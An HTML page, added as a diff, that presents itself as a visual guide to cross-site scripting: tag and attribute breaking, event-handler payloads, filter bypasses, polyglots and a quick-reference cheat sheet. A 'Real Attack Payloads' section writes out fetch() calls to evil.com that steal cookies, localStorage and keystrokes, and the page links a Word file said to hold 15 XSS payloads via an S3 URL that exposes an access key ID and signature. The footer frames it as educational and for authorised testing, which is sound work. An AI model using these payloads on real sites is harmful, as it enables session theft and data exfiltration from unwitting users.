@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attack Techniques — Visual Guide</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'SF Mono', 'Monaco', 'Menlo', monospace;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        
+        .hero {
+            background: linear-gradient(135deg, #0a0f1a 0%, #1a0a1a 100%);
+            padding: 60px 20px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+        .hero h1 {
+            font-size: 2.5em;
+            background: linear-gradient(90deg, #00ff88, #00aaff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+        }
+        .hero p {
+            color: #888;
+            font-size: 1.1em;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .technique {
+            background: #12121a;
+            border-radius: 16px;
+            margin-bottom: 40px;
+            overflow: hidden;
+            border: 1px solid #252530;
+        }
+        .technique-header {
+            background: linear-gradient(90deg, #1a1a25, #252530);
+            padding: 20px 24px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #333;
+        }
+        .technique-num {
+            background: linear-gradient(135deg, #00ff88, #00aaff);
+            color: #000;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+        .technique-title {
+            font-size: 1.3em;
+            color: #fff;
+        }
+        .technique-body {
+            padding: 24px;
+        }
+        .technique-desc {
+            color: #aaa;
+            margin-bottom: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        .visual-demo {
+            background: #0a0a0f;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #252530;
+        }
+        .visual-demo h4 {
+            color: #00ff88;
+            font-size: 0.85em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+        }
+        
+        .html-box {
+            background: #1a1a25;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 10px 0;
+            overflow-x: auto;
+            position: relative;
+        }
+        .html-box::before {
+            content: attr(data-label);
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            font-size: 0.7em;
+            color: #555;
+            text-transform: uppercase;
+        }
+        .html-box code {
+            font-size: 0.9em;
+            line-height: 1.8;
+        }
+        
+        .tag { color: #ff79c6; }
+        .attr { color: #50fa7b; }
+        .value { color: #f1fa8c; }
+        .inject { color: #ff5555; background: rgba(255,85,85,0.15); padding: 2px 4px; border-radius: 3px; }
+        .comment { color: #6272a4; }
+        .safe { color: #50fa7b; }
+        
+        .arrow-down {
+            text-align: center;
+            font-size: 2em;
+            color: #ff5555;
+            padding: 10px;
+        }
+        
+        .result-box {
+            background: rgba(255,85,85,0.1);
+            border: 1px solid #ff5555;
+            border-radius: 8px;
+            padding: 16px;
+        }
+        .result-box.success {
+            background: rgba(80,250,123,0.1);
+            border-color: #50fa7b;
+        }
+        
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .payload-card {
+            background: #1a1a25;
+            border-radius: 8px;
+            padding: 16px;
+            border: 1px solid #252530;
+        }
+        .payload-card h5 {
+            color: #00aaff;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+        .payload-card code {
+            display: block;
+            background: #0a0a0f;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            color: #ff79c6;
+            word-break: break-all;
+        }
+        
+        .concept-box {
+            background: linear-gradient(135deg, rgba(0,255,136,0.1), rgba(0,170,255,0.1));
+            border-left: 4px solid #00ff88;
+            padding: 16px 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .concept-box strong {
+            color: #00ff88;
+        }
+        
+        .flow-diagram {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            padding: 20px;
+            background: #0a0a0f;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+        .flow-box {
+            background: #1a1a25;
+            padding: 12px 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #333;
+        }
+        .flow-box.bad {
+            border-color: #ff5555;
+            background: rgba(255,85,85,0.1);
+        }
+        .flow-box.good {
+            border-color: #50fa7b;
+            background: rgba(80,250,123,0.1);
+        }
+        .flow-arrow {
+            color: #555;
+            font-size: 1.5em;
+        }
+        
+        .table-wrap {
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9em;
+        }
+        th, td {
+            padding: 12px 16px;
+            text-align: left;
+            border-bottom: 1px solid #252530;
+        }
+        th {
+            background: #1a1a25;
+            color: #00ff88;
+            font-weight: 600;
+        }
+        td code {
+            background: #252530;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            color: #ff79c6;
+        }
+        
+        .download-section {
+            background: linear-gradient(135deg, #1a0a1a, #0a1a1a);
+            border: 2px solid #00aaff;
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+            margin: 40px 0;
+        }
+        .download-section h3 {
+            color: #00aaff;
+            margin-bottom: 15px;
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(90deg, #00ff88, #00aaff);
+            color: #000;
+            padding: 14px 32px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 700;
+            margin-top: 15px;
+            transition: transform 0.2s;
+        }
+        .download-btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 40px;
+            color: #555;
+            border-top: 1px solid #252530;
+        }
+    </style>
+</head>
+<body>
+    <div class="hero">
+        <h1>💉 XSS Attack Techniques</h1>
+        <p>A visual guide to Cross-Site Scripting injection methods</p>
+    </div>
+    
+    <div class="container">
+        
+        <!-- TECHNIQUE 1: TAG BREAKING -->
+        <div class="technique">
+            <div class="technique-header">
+                <div class="technique-num">1</div>
+                <div class="technique-title">Tag Breaking</div>
+            </div>
+            <div class="technique-body">
+                <p class="technique-desc">Close the current HTML element, inject your payload, then reopen to keep the page structure valid.</p>
+                
+                <div class="concept-box">
+                    <strong>💡 Concept:</strong> If your input appears inside a <code>&lt;div&gt;</code>, close it with <code>&lt;/div&gt;</code>, add your script, then open a new <code>&lt;div&gt;</code>.
+                </div>
+                
+                <div class="visual-demo">
+                    <h4>Before (Original HTML)</h4>
+                    <div class="html-box" data-label="HTML">
+                        <code>
+                            <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="value">"style-name"</span><span class="tag">&gt;</span><br>
+                            &nbsp;&nbsp;<span class="comment">&lt;!-- Your input goes here --&gt;</span><br>
+                            &nbsp;&nbsp;<strong>STYLE_NAME_HERE</strong><br>
+                            <span class="tag">&lt;/div&gt;</span>
+                        </code>
+                    </div>
+                    
+                    <div class="arrow-down">⬇️ Inject Payload</div>
+                    
+                    <div class="html-box" data-label="Payload">
+                        <code><span class="inject">&lt;/div&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;div&gt;</span></code>
+                    </div>
+                    
+                    <div class="arrow-down">⬇️ Result</div>
+                    
+                    <div class="html-box result-box" data-label="Executed HTML">
+                        <code>
+                            <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="value">"style-name"</span><span class="tag">&gt;</span><br>
+                            <span class="tag">&lt;/div&gt;</span><br>
+                            <span class="inject">&lt;script&gt;alert('XSS')&lt;/script&gt;</span> <span class="comment">&lt;!-- EXECUTES! --&gt;</span><br>
+                            <span class="tag">&lt;div&gt;&lt;/div&gt;</span>
+                        </code>
+                    </div>
+                </div>
+                
+                <div class="payload-grid">
+                    <div class="payload-card">
+                        <h5>Basic Break</h5>
+                        <code>&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;div&gt;</code>
+                    </div>
+                    <div class="payload-card">
+                        <h5>Shotgun (Multiple Tags)</h5>
+                        <code>&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 2: ATTRIBUTE BREAKING -->
+        <div class="technique">
+            <div class="technique-header">
+                <div class="technique-num">2</div>
+                <div class="technique-title">Attribute Breaking</div>
+            </div>
+            <div class="technique-body">
+                <p class="technique-desc">If your input lands inside an HTML attribute (like value="" or class=""), break out of the quotes.</p>
+                
+                <div class="concept-box">
+                    <strong>💡 Concept:</strong> Use <code>"&gt;</code> to close the attribute and tag, then inject your payload.
+                </div>
+                
+                <div class="visual-demo">
+                    <h4>Before (Original HTML)</h4>
+                    <div class="html-box" data-label="HTML">
+                        <code>
+                            <span class="tag">&lt;input</span> <span class="attr">value</span>=<span class="value">"<strong>USER_INPUT</strong>"</span><span class="tag">&gt;</span>
+                        </code>
+                    </div>
+                    
+                    <div class="arrow-down">⬇️ Inject Payload</div>
+                    
+                    <div class="html-box" data-label="Payload">
+                        <code><span class="inject">"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;input value="</span></code>
+                    </div>
+                    
+                    <div class="arrow-down">⬇️ Result</div>
+                    
+                    <div class="html-box result-box" data-label="Executed HTML">
+                        <code>
+                            <span class="tag">&lt;input</span> <span class="attr">value</span>=<span class="value">""</span><span class="tag">&gt;</span><br>
+                            <span class="inject">&lt;script&gt;alert('XSS')&lt;/script&gt;</span> <span class="comment">&lt;!-- EXECUTES! --&gt;</span><br>
+                            <span class="tag">&lt;input</span> <span class="attr">value</span>=<span class="value">""</span><span class="tag">&gt;</span>
+                        </code>
+                    </div>
+                </div>
+                
+                <div class="payload-grid">
+                    <div class="payload-card">
+                        <h5>Double Quote Break</h5>
+                        <code">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                    </div>
+                    <div class="payload-card">
+                        <h5>Single Quote Break</h5>
+                        <code>'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                    </div>
+                    <div class="payload-card">
+                        <h5>Event Handler Inject</h5>
+                        <code>" onmouseover="alert(1)</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 3: EVENT HANDLERS -->
+        <div class="technique">
+            <div class="technique-header">
+                <div class="technique-num">3</div>
+                <div class="technique-title">Event Handlers (No Script Tag)</div>
+            </div>
+            <div class="technique-body">
+                <p class="technique-desc">Many filters block &lt;script&gt; tags but forget about event handlers on other elements.</p>
+                
+                <div class="concept-box">
+                    <strong>💡 Concept:</strong> Use <code>onerror</code>, <code>onload</code>, <code>onfocus</code> etc. to trigger JavaScript without &lt;script&gt; tags.
+                </div>
+                
+                <div class="flow-diagram">
+                    <div class="flow-box bad">
+                        <code>&lt;script&gt;</code><br>
+                        <small>❌ Blocked</small>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-box good">
+                        <code>&lt;img onerror&gt;</code><br>
+                        <small>✓ Allowed</small>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-box good">
+                        <code>&lt;svg onload&gt;</code><br>
+                        <small>✓ Allowed</small>
+                    </div>
+                </div>
+                
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Element</th>
+                                <th>Event</th>
+                                <th>Payload</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Image</td>
+                                <td>onerror</td>
+                                <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>SVG</td>
+                                <td>onload</td>
+                                <td><code>&lt;svg onload=alert(1)&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Body</td>
+                                <td>onload</td>
+                                <td><code>&lt;body onload=alert(1)&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Input</td>
+                                <td>onfocus</td>
+                                <td><code>&lt;input onfocus=alert(1) autofocus&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Details</td>
+                                <td>ontoggle</td>
+                                <td><code>&lt;details open ontoggle=alert(1)&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Video</td>
+                                <td>onerror</td>
+                                <td><code>&lt;video src=x onerror=alert(1)&gt;</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 4: FILTER BYPASSES -->
+        <div class="technique">
+            <div class="technique-header">
+                <div class="technique-num">4</div>
+                <div class="technique-title">Filter Bypasses</div>
+            </div>
+            <div class="technique-body">
+                <p class="technique-desc">When basic payloads are blocked, use encoding, case tricks, or alternative syntax.</p>
+                
+                <div class="visual-demo">
+                    <h4>Common Bypass Techniques</h4>
+                    
+                    <div class="payload-grid">
+                        <div class="payload-card">
+                            <h5>No Spaces</h5>
+                            <code>&lt;img/src=x/onerror=alert(1)&gt;</code>
+                        </div>
+                        <div class="payload-card">
+                            <h5>No Quotes</h5>
+                            <code>&lt;img src=x onerror=alert(1)&gt;</code>
+                        </div>
+                        <div class="payload-card">
+                            <h5>No Parentheses</h5>
+                            <code>&lt;img src=x onerror=alert`1`&gt;</code>
+                        </div>
+                        <div class="payload-card">
+                            <h5>Mixed Case</h5>
+                            <code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code>
+                        </div>
+                        <div class="payload-card">
+                            <h5>HTML Entities</h5>
+                            <code>&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code>
+                        </div>
+                        <div class="payload-card">
+                            <h5>Double Encoding</h5>
+                            <code>%253Cscript%253Ealert(1)</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 5: POLYGLOT -->
+        <div class="technique">
+            <div class="technique-header">
+                <div class="technique-num">5</div>
+                <div class="technique-title">Polyglot Payloads</div>
+            </div>
+            <div class="technique-body">
+                <p class="technique-desc">A single payload designed to work in multiple injection contexts simultaneously.</p>
+                
+                <div class="concept-box">
+                    <strong>💡 Concept:</strong> Start with quotes and brackets to break out of ANY context — attribute, tag, or JavaScript.
+                </div>
+                
+                <div class="visual-demo">
+                    <h4>Universal Polyglot</h4>
+                    <div class="html-box" data-label="Payload">
+                        <code><span class="inject">'\"&gt;&lt;img src=x onerror=alert(1)&gt;</span></code>
+                    </div>
+                    
+                    <p style="margin-top:20px; color:#888;">Works in:</p>
+                    <ul style="margin-left:20px; color:#aaa;">
+                        <li>Double quote attributes: <code>value="..."</code></li>
+                        <li>Single quote attributes: <code>value='...'</code></li>
+                        <li>Raw HTML context</li>
+                        <li>Some JavaScript string contexts</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 6: REAL ATTACK -->
+        <div class="technique">
+            <div class="technique-header">
+                <div class="technique-num">6</div>
+                <div class="technique-title">Real Attack Payloads</div>
+            </div>
+            <div class="technique-body">
+                <p class="technique-desc">Once you can execute JavaScript, here's what attackers actually do.</p>
+                
+                <div class="payload-grid">
+                    <div class="payload-card">
+                        <h5>🍪 Steal Cookies</h5>
+                        <code>fetch('https://evil.com/?c='+document.cookie)</code>
+                    </div>
+                    <div class="payload-card">
+                        <h5>💾 Steal localStorage</h5>
+                        <code>fetch('https://evil.com/?d='+JSON.stringify(localStorage))</code>
+                    </div>
+                    <div class="payload-card">
+                        <h5>⌨️ Keylogger</h5>
+                        <code>document.onkeypress=e=>fetch('https://evil.com/?k='+e.key)</code>
+                    </div>
+                    <div class="payload-card">
+                        <h5>📄 Modify Document (Office)</h5>
+                        <code>Word.run(c=>{c.document.body.insertParagraph('HACKED',Word.InsertLocation.start);return c.sync()})</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- QUICK REFERENCE -->
+        <div class="technique">
+            <div class="technique-header">
+                <div class="technique-num">📋</div>
+                <div class="technique-title">Quick Reference Cheat Sheet</div>
+            </div>
+            <div class="technique-body">
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Context</th>
+                                <th>Payload</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Raw HTML</td>
+                                <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Inside &lt;div&gt;</td>
+                                <td><code>&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;div&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Inside value=""</td>
+                                <td><code">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Inside value=''</td>
+                                <td><code>'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Filter blocks &lt;script&gt;</td>
+                                <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Filter blocks alert</td>
+                                <td><code>&lt;img src=x onerror=confirm(1)&gt;</code></td>
+                            </tr>
+                            <tr>
+                                <td>Multi-context (polyglot)</td>
+                                <td><code>'"&gt;&lt;img src=x onerror=alert(1)&gt;</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+        
+        <!-- DOWNLOAD -->
+        <div class="download-section">
+            <h3>🧪 Test Document with 15 Payloads</h3>
+            <p style="color:#888;">Word document with multiple XSS techniques embedded in style names</p>
+            <a href="https://supernovasmagnificentknowledgebaseexperts.s3.amazonaws.com/test-files/xss-multi-payload-test.docx?AWSAccessKeyId=AKIAWPLXO6L36FTDYMMP&Signature=ZEitp%2FwUbgg7iKGagSJyABEfcWM%3D&Expires=1770682939" class="download-btn" download>
+                ⬇️ Download Test Document
+            </a>
+        </div>
+        
+    </div>
+    
+    <div class="footer">
+        <p>XSS Techniques Guide • For educational and authorized security testing only</p>
+    </div>
+</body>
+</html>
